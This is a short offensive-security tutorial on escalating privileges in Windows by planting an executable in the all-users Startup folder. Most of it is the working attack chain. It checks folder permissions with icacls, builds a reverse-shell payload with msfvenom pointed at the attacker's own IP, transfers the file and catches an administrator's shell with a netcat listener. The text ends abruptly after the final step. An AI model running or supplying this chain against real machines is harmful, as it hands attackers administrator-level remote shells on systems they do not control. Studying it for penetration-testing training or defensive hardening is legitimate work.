Windows provides a mechanism for users to specify applications that should automatically launch upon user authentication. This is done by placing the application's executable files in specific startup directories. While this feature can be convenient for legitimate users, it can also pose a security risk if not properly managed.






Startup applications that are executed when all users (including administrators) authenticate are usually stored in the following folder:
```
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
```
The first step is to verify whether our user has write access to this directory.
```
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```
If we have the needed permissions, we could place our malicious executable to that folder.

EXPLOIT
-
1. The first step is to generate some shellcode using ```MSFvenom``` :
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<our ip> LPORT=1234 -f exe > shell.exe
   ```
2. Then transferring shell.exe file to the Windows victim machine using the Python web server and placing it in this `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
` foler.
3. The next step is to set up a Netcat listener:
   ```
   nc -nlvp 1234
   ```

4. Assuming that we have an administrator making logon action .
5. Once the administrator has logged on, the malicious executable was executed, therefore granting a reverse shell as that user:







